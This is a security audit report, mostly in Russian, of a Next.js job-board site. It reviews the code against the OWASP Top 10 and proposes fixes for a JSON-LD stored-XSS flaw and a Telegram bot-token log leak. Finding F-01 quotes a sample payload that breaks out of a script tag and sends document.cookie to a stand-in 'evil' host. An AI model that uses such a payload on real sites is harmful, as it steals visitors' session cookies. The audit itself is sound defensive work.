---
type: security-audit
created: 2026-05-13
feature: digital-pub-mvp
status: complete
---

# Security Audit — digital-pub-mvp

**Scope:** финальный security-аудит перед /done. Проверка по OWASP Top 10 (2021),
требований tech-spec (Decisions 5, 10, 11), а также управления секретами,
SQL/XSS/CSRF и зависимостей.

**Files audited:**

- `next.config.mjs`
- `lib/articles.ts`, `lib/posts.ts`, `lib/tags.ts`, `lib/prisma.ts`
- `app/articles/[slug]/page.tsx`, `app/articles/page.tsx`
- `app/vacancies/[category]/page.tsx`, `app/vacancies/[category]/[slug]/page.tsx`
- `app/resumes/tag/[tagSlug]/page.tsx`
- `app/post/[id]/page.tsx`, `app/page.tsx`, `app/layout.tsx`, `app/sitemap.ts`
- `app/not-found.tsx`
- `components/JsonLd.tsx`, `components/HomePage.tsx`, `components/PostDetail.tsx`,
  `components/feed/Feed.tsx`, `components/Navbar.tsx`
- `scripts/sync-telegram.ts`
- `.env.example`, `public/robots.txt`, `package.json`
- `npm audit` output

---

## 1. Executive Summary

**Overall risk level: MEDIUM.**

В коде применены продуманные защитные меры там, где это критично:
zod-валидация slug, allowlist MDX через отсутствие `components` prop,
path-traversal через `fs.readdirSync` cross-check, secret-санитайзер для
bot token в логах, отсутствие raw SQL, отсутствие пользовательских fetch,
безопасные security headers.

При этом найдено **2 находки уровня P1** — **(a) JSON-LD injection через
Telegram-контент** в `components/JsonLd.tsx` (потенциальный stored XSS,
обходящий React's auto-escaping), и **(b) утечка bot token в логи через
неоsanitized `console.error` в `downloadImageLocally`**. Обе имеют узкий
вектор эксплуатации, но классические для OWASP A03/A09 и должны быть
исправлены до публичного снятия noindex (если оно ещё не выполнено).

Также найдена **HIGH-severity CVE в `next-mdx-remote@5.0.0`**
(arbitrary code execution в SSR untrusted MDX, GHSA-g4xw-jxrg-5f6m) —
**в нашем контексте contained до P2**, так как MDX-файлы происходят из
репозитория, не от пользователей, но рекомендуется upgrade на 6.x.

Остальные находки — P2/P3 (отсутствие zod в layer `app/vacancies/[category]`,
fallback DATABASE_URL без пароля, `robots: index:true` при заявленном noindex,
13 transitive npm-уязвимостей в dev-зависимостях).

**Critical (P0) находок нет.**

---

## 2. Findings by OWASP Top 10

### A01: Broken Access Control — clean

Аутентификации в MVP нет (Decision 7: removed "Войти", auth deferred to
iteration 2). Все маршруты публичные read-only. Нет API-endpoints с
изменением состояния — Telegram-sync запускается серверным cron'ом,
не через HTTP. CSRF не применим, т.к. отсутствуют state-changing endpoints
от имени пользователя.

`X-Frame-Options: SAMEORIGIN` в `next.config.mjs:21` корректно ограничивает
embed.

---

### A02: Cryptographic Failures — clean

Никакого собственного крипто. Secret для сессий не нужен (нет сессий).
`bcrypt` упомянут в `.env.example` (`ADMIN_PASSWORD_HASH`), но в коде MVP
не используется. Все исходящие запросы (Telegram, Yandex/Google analytics)
идут по HTTPS.

---

### A03: Injection

#### F-01 [P1 — High] JSON-LD injection через Telegram-контент (stored XSS)

**File:** `components/JsonLd.tsx:9`

```tsx
<script
  type="application/ld+json"
  dangerouslySetInnerHTML={{ __html: JSON.stringify(data) }}
/>
```

**Issue:** `JSON.stringify` корректно экранирует JSON-спецсимволы (`"`, `\`),
но **не экранирует `<` и `/`**. HTML-парсер закрывает `<script>` по
литеральному `</script>` **внутри любого контекста, включая JSON-строки**.

**Attack vector:** Любое поле, попадающее в JSON-LD объекты, происходит из
БД, а БД заполняется `scripts/sync-telegram.ts` из публичных Telegram-каналов:

- `app/vacancies/[category]/[slug]/page.tsx:58-95` — `jobPostingLd` использует
  `post.title`, `post.description`, `post.company`, `post.salary` — все из
  Telegram
- breadcrumbLd использует `post.title`, `tag.name`
- `app/articles/[slug]/page.tsx:55-91` — MDX-контент из репо (trusted), но
  потенциально та же проблема, если когда-нибудь данные пойдут из БД

Если автор Telegram-поста (или скомпрометированный канал, или будущий
не-модерируемый источник вроде `@pub_resume`) опубликует пост с заголовком:

```
Senior SMM </script><script>fetch('//evil/?'+document.cookie)</script>
```

то на странице `/vacancies/smm/<slug>` выполнится произвольный JS на
домене d-pub.ru. Decision 12 явно отказывается от модерации в MVP —
это усугубляет риск.

**Recommendation:** Заменить `JSON.stringify(data)` на

```ts
JSON.stringify(data).replace(/</g, '\\u003c')
```

— стандартный приём для безопасного inline-JSON. Применить в `JsonLd.tsx`
и в `app/layout.tsx:106` (тот же паттерн для `websiteJsonLd`, хотя там
input статический).

#### F-02 [P3 — Low] Inline-script template literals для аналитики

**File:** `app/layout.tsx:115-122, 146-151`

`NEXT_PUBLIC_YANDEX_METRIKA_ID` и `NEXT_PUBLIC_GA_MEASUREMENT_ID`
интерполируются прямо в inline `<Script>` через template literal. Если
значение env-переменной попадёт под контроль атакующего (компрометация
.env), получится XSS. На практике env контролируется владельцем — это
P3 защита-в-глубину.

**Recommendation:** при выставлении значений валидировать как `^[A-Z0-9-]+$`
на этапе app-start (можно через zod).

#### SQL injection — clean

`grep $queryRaw|$executeRaw` по проекту → ничего. Все запросы идут через
Prisma builder-методы (`findMany`, `findUnique`, `count`, `create`,
`createMany`, `groupBy`). Параметризованы автоматически.

#### Reflected/DOM XSS — clean

Поиск (`components/Navbar.tsx`, `components/feed/Feed.tsx`) хранит query
в state и применяет только `.toLowerCase()` + `String.prototype.includes`
для сравнения. Никакого innerHTML/eval. React сам экранирует `{query}`.

`PostDetail.tsx:99-103` рендерит `post.description` через `<p>{line}</p>` —
автоматический escape React.

#### Stored XSS via `tag.seoText` — accepted risk

**Files:** `app/vacancies/[category]/page.tsx:120`,
`app/resumes/tag/[tagSlug]/page.tsx:118`, `components/HomePage.tsx:81`

`dangerouslySetInnerHTML={{ __html: tag.seoText }}`. seoText пишется
исключительно вручную через скрипты `scripts/seo-texts-batch{1,2,3}.ts`
и `fill-seo-tags.ts` — это редакторский контент, не пользовательский.
Тот же `seoHtml` в `app/page.tsx:33` — hardcoded literal. **Acceptable
trust model**, но стоит зафиксировать в комментарии у каждого использования
("trusted, written via seed scripts only — DO NOT pass user input here").

---

### A04: Insecure Design

#### F-03 [P3 — Info] Decision 10 partially enforced — zod в page-layer пропущен

**Files:**

- `app/vacancies/[category]/page.tsx:18` — `getTagBySlug(category)` без
  предварительной zod-валидации
- `app/vacancies/[category]/[slug]/page.tsx:16, 48, 52` — то же для
  `getPostBySlug(slug)`, `getTagBySlug(category)`
- `app/resumes/tag/[tagSlug]/page.tsx:15, 42` — то же

**Mitigating control:** Все три эти функции (`getPostBySlug`, `getTagBySlug`,
`getPostsByTag`) **сами** валидируют через `slugSchema.safeParse(slug)`
до запроса в БД — см. `lib/posts.ts:150-152`, `lib/tags.ts:43-45`,
`lib/tags.ts:65-67`. Невалидный slug возвращает `null`/`[]`, далее срабатывает
`if (!tag) notFound()`. **Поведение корректно: 404 до БД-запроса.**

Tech-spec Decision 10 говорит "Validate all dynamic route slugs ... with
zod schema. Return 404 for invalid slugs without querying DB". Это
выполнено de facto — но **не в page-layer**, как может показаться по
прочтению Decision. Архитектурно лучше дублировать валидацию в самой
странице, чтобы защита не зависела от дисциплины в lib-функциях.

**Recommendation:** опционально добавить `slugSchema.safeParse(category)`
в начале каждой page-функции, явно вызывая `notFound()`. Минор —
функциональность не страдает.

#### F-04 [P2 — Medium] Sync не модерирует контент (intentional, Decision 12)

Tech-spec Decision 12 явно отказывается от модерации: посты из Telegram
идут со `status: 'published'` напрямую. Это **архитектурное решение** и
основная причина, по которой F-01 (JSON-LD injection) становится живой
угрозой. Модерация перенесена на итерацию 2.

**Recommendation:** в качестве временной меры до итерации 2:

1. Срочно исправить F-01 (это закрывает атакующий вектор XSS даже без
   модерации)
2. Добавить sanitize-pass в `sync-telegram.ts:parseTitle` / `savePost`:
   strip-tag для очевидных HTML/script-инъекций
3. Зафиксировать allowlist `CHANNELS` (уже сделано в коде, два канала)

---

### A05: Security Misconfiguration

#### F-05 [P3 — Info] Заявленный noindex не соблюдён в коде

`app/layout.tsx:33-36` — `robots: { index: true, follow: true }`.
`public/robots.txt` — `Disallow:` (пустой). Из коробки сайт **открыт
для индексации поисковиков**.

Тони указал, что сайт "закрыт noindex". Если это управляется через
nginx (`X-Robots-Tag: noindex` на уровне reverse-proxy) или временно —
ОК. Если предполагалось контролировать на уровне приложения — это
расхождение с заявленным состоянием. Документировать решение явно в
deployment.md.

**Note:** в tech-spec Decision 11 фраза "noindex намеренно" отсутствует —
Decision 11 говорит только про X-Frame-Options/X-Content-Type-Options/
Referrer-Policy. То есть в коде всё так, как написано в спеке.

#### Security headers — verified

`next.config.mjs:16-27`:

- `X-Frame-Options: SAMEORIGIN` ✓
- `X-Content-Type-Options: nosniff` ✓
- `Referrer-Policy: strict-origin-when-cross-origin` ✓

Полностью соответствует Decision 11. CSP действительно отложен на iter 2
(это явно в decision).

#### F-06 [P3 — Info] Fallback DATABASE_URL в lib/prisma.ts

`lib/prisma.ts:6-7`:

```ts
const connectionString =
  process.env.DATABASE_URL ?? 'postgresql://antonrendel@localhost:5432/digital_pub'
```

Fallback **без пароля** на локальный сокет — это не утечка секрета (там
нет креденшалов), но в проде если `DATABASE_URL` забыт, приложение тихо
полезет в локальную БД от имени `antonrendel`. На VPS такого юзера/БД
нет → fail-loud. Минор.

**Recommendation:** заменить на `throw new Error('DATABASE_URL is required')`
в продакшене, либо как минимум `console.warn`.

---

### A06: Vulnerable and Outdated Components

**`npm audit`:** 13 vulnerabilities (5 moderate, 8 high).

| Package | Sev | Direct? | Used in prod? | Severity → нас |
|---|---|---|---|---|
| **next-mdx-remote@5.0.0** | high | yes (direct) | **YES — runtime** | **P2** |
| postcss < 8.5.10 | moderate | no | build-time only | P3 |
| playwright < 1.55.1 | high | dev | dev-only | P3 |
| fast-uri ≤ 3.1.1 | high | transitive | dev-only | P3 |
| @hono/node-server, hono | moderate | transitive via @prisma/dev | dev-only | P3 |

#### F-07 [P2 — Medium] next-mdx-remote@5.0.0 CVE GHSA-g4xw-jxrg-5f6m

**Title:** "next-mdx-remote affected by arbitrary code execution in React
server-side rendering of untrusted MDX content".

**Эксплуатация в нашем контексте:** требует, чтобы атакующий мог положить
MDX-файл в `content/articles/`. Это git-репо, контроль ограничен
коммитерами. Production runtime не принимает MDX от пользователей.
→ **остаточный риск — низкий, но "untrusted" вектор появляется при любой
будущей фиче типа admin-загрузки статей**.

**Recommendation:** запланировать апгрейд на 6.x в итерации 2.
Не блокер для /done MVP.

#### Остальные uplevels

- `playwright` — dev-only (TLS verification при скачивании браузеров).
  Запуск только в CI/локально → low risk.
- `postcss XSS via </style>` — build-time tool, эксплуатация требует
  malicious CSS-input в билд-пайплайне → low risk.
- `fast-uri` / `hono` / `@hono/node-server` — все приходят через
  `@prisma/dev`, dev-only.

**Action:** запустить `npm audit fix` (без `--force`) — поднимет
playwright. Все остальное требует breaking changes и может ждать iter 2.

---

### A07: Identification and Authentication Failures — N/A

Auth не реализован (Decision 7, intentional). Endpoints публичные read-only.

---

### A08: Software and Data Integrity Failures

`next-mdx-remote` (см. F-07) — covered.

`gray-matter@4.0.3` — известная historic CVE по prototype pollution через
YAML, но в нашем случае: 1) MDX из репо trusted; 2) обработка через
`safeParse` zod-схемы. Низкий риск.

`scripts/sync-telegram.ts`: внешний контент (Telegram) сохраняется в БД
без подписи/целостности — но это входной поток данных, не CI artifact.
OK для job-board UX.

---

### A09: Security Logging and Monitoring Failures

#### F-08 [P1 — High] Возможная утечка BOT_TOKEN в логи

**File:** `scripts/sync-telegram.ts:154`

```ts
} catch (e) {
  console.error(`  Failed to download image: ${e}`)
  return null
}
```

В отличие от `downloadPhotoViaBotAPI` (где используется `sanitizeError`),
функция `downloadImageLocally` логирует raw `${e}` без санитайзера.
Вызывается она с URL `${TG_FILE}/${file_path}`, где `TG_FILE` =
`https://api.telegram.org/file/bot${BOT_TOKEN}`. Если fetch выбросит
ошибку с URL в message/stack (например `FetchError: getaddrinfo ENOTFOUND
api.telegram.org for url https://api.telegram.org/file/bot<TOKEN>/...`),
**bot token попадёт в stdout PM2-логов и далее в любые системы сбора
логов / алертинга**.

PM2-логи на NetAngels-VPS обычно остаются на диске сервера, доступ
имеют админы — но это всё равно утечка sensitive secret в долгосрочное
хранилище.

**Recommendation:** обернуть в `sanitizeError(e)`:

```ts
} catch (e) {
  console.error(`  Failed to download image: ${sanitizeError(e)}`)
  return null
}
```

Сама функция `sanitizeError` (строки 484-487) хорошо построена —
просто нужно применить её во **всех** местах, где логируется
исключение от fetch'а на `api.telegram.org`.

**Дополнительно:** регулярка `sanitizeError` ловит только формат
`bot<digits>:<token>`. Стоит расширить на любой `api.telegram.org/...`
URL, чтобы не пропустить альтернативные форматы в будущих SDK.

#### F-09 [P3 — Info] Логи sync пишут `Sync failed: ...` — `${e}` после санитайзера

`scripts/sync-telegram.ts:490` — корректно использует `sanitizeError`. OK.

#### No structured logging / audit trail

Production не имеет structured logging (winston/pino), нет audit-trail
для sync-операций. Для MVP допустимо, на iter 2 — рекомендуется.

---

### A10: Server-Side Request Forgery — clean

`fetch()` вызывается в коде только из `scripts/sync-telegram.ts`, и
URL'ы там **полностью hardcoded** или строятся из hardcoded `TG_API` +
полей, которые сам же скрипт извлекает из Telegram-ответа. Никаких
fetch'ей с user-controlled URL. Никаких proxy-endpoint'ов в `app/api/*`
(этого каталога нет вовсе).

`next/image` — `remotePatterns` явно ограничен `cdn4.telesco.pe` и
`*.telesco.pe`. Защита от SSRF в image-optimizer корректна.

---

## 3. Path Traversal Specific (Decision 5)

`lib/articles.ts:75-103` — `getArticleBySlug`:

1. zod-валидация по `/^[a-z0-9-]+$/` (строка 8) — никаких `..`, `/`, `\`
   не пропустит
2. `fs.readdirSync(ARTICLES_DIR)` → массив реальных файлов → `.find(f => f === slug+'.mdx')`
3. Только если файл реально найден в allowlist — читается

**Двойная защита: regex + allowlist.** Path traversal закрыт.

---

## 4. MDX Component Allowlist Specific (Decision 5)

`app/articles/[slug]/page.tsx:133-137`:

```tsx
<MDXRemote
  source={article.content}
  options={{ mdxOptions: { remarkPlugins: [remarkGfm] } }}
/>
```

**Note:** `components` prop **не передаётся**, что в next-mdx-remote
означает: только стандартные HTML-теги (h1-h6, p, ul, li, a, img, ...)
рендерятся. Любые кастомные JSX-теги в MDX (`<Counter />`, `<script />`)
вызовут ошибку — `next-mdx-remote` не знает, как их рендерить.

`lib/articles.ts:119-127` — экспортируется константа `MDX_ALLOWED_ELEMENTS`
как декларация намерения, но на runtime она не используется
("декоративная" защита). **Реальная защита — отсутствие `components`
prop + контент из git-репо.**

**Ограничение:** MDX поддерживает **сырой HTML** в content. Например `<script>alert(1)</script>`
напрямую в .mdx-файле будет отрендерен. Защита тут — что MDX-файлы
trusted (из репо). Дополнительная защита: можно добавить `rehype-sanitize`
в `rehypePlugins`, но это P3.

---

## 5. Secrets Management — Summary

| Item | Status |
|---|---|
| `.env` не закоммичен | ✓ только `.env.example` |
| `.env.example` без реальных секретов | ✓ placeholders |
| `next.config.mjs` без hardcoded secrets | ✓ |
| `lib/prisma.ts` без hardcoded creds | ✓ (fallback без пароля — F-06) |
| `scripts/sync-telegram.ts` без hardcoded BOT_TOKEN | ✓ читает из bot's .env |
| `sanitizeError` для logging | ⚠ применяется не везде — F-08 |

---

## 6. Findings Summary Table

| ID | Severity | OWASP | File | Status |
|---|---|---|---|---|
| F-01 | **P1** | A03 (Injection) | `components/JsonLd.tsx` | open |
| F-02 | P3 | A03 | `app/layout.tsx` | open |
| F-03 | P3 | A04 | `app/vacancies/[category]/page.tsx` и др. | mitigated by lib-layer |
| F-04 | P2 | A04 | `scripts/sync-telegram.ts` | intentional (Decision 12) |
| F-05 | P3 | A05 | `app/layout.tsx` robots | needs deploy-docs clarification |
| F-06 | P3 | A05 | `lib/prisma.ts` | open |
| F-07 | P2 | A06 | `package.json` next-mdx-remote | open, iter 2 |
| F-08 | **P1** | A09 | `scripts/sync-telegram.ts:154` | open |
| F-09 | — | A09 | `scripts/sync-telegram.ts:490` | clean |

P0: **0** · P1: **2** · P2: **2** · P3: **5**.

---

## 7. Verdict

### Готов ли feature к `/done`?

**Условно ДА.** Critical (P0) находок нет. **P1** находки реальные, но
имеют узкие векторы (требуют контента из Telegram-канала с зловредной
строкой / требуют исключения из fetch с URL в сообщении), а сайт
сейчас закрыт от индексации (по утверждению Тони) — public exposure
снижен.

### Рекомендуемые блокеры до **снятия noindex** (или до публичного
   анонса):

1. **F-01** — добавить `.replace(/</g, '\\u003c')` в `JsonLd.tsx` (одна
   строка). 2 минуты работы. Закроет реальный stored-XSS-вектор через
   Telegram-контент.
2. **F-08** — обернуть `console.error` в `downloadImageLocally` через
   `sanitizeError`. 2 минуты работы. Закроет утечку BOT_TOKEN в PM2-логи.

### Можно отложить до итерации 2:

- F-04 (модерация — уже intentional)
- F-07 (upgrade next-mdx-remote → 6.x — breaking change)
- F-02, F-03, F-05, F-06 (защита-в-глубину)

### Что НЕ требует действий:

- Path traversal (закрыт)
- MDX allowlist (закрыт через отсутствие `components` prop + trusted source)
- SQL injection (нет raw SQL)
- SSRF (нет user-controlled fetch)
- Security headers (выполнено по Decision 11)
- CSRF (нет state-changing endpoints)

---

## 8. Suggested Fixes (code snippets)

### Fix F-01

```tsx
// components/JsonLd.tsx
export default function JsonLd({ data }: { data: Record<string, unknown> }) {
  return (
    <script
      type="application/ld+json"
      dangerouslySetInnerHTML={{
        __html: JSON.stringify(data).replace(/</g, '\\u003c'),
      }}
    />
  )
}
```

То же самое в `app/layout.tsx:104-107` для `websiteJsonLd`.

### Fix F-08

```ts
// scripts/sync-telegram.ts:153
} catch (e) {
  console.error(`  Failed to download image: ${sanitizeError(e)}`)
  return null
}
```

И расширить `sanitizeError` (строка 484):

```ts
function sanitizeError(e: unknown): string {
  const msg = e instanceof Error ? e.message : String(e)
  return msg
    .replace(/bot[0-9]+:[A-Za-z0-9_-]+/g, 'bot***:***')
    .replace(/api\.telegram\.org\/(file\/)?bot[^\s/]+/g, 'api.telegram.org/bot***')
}
```
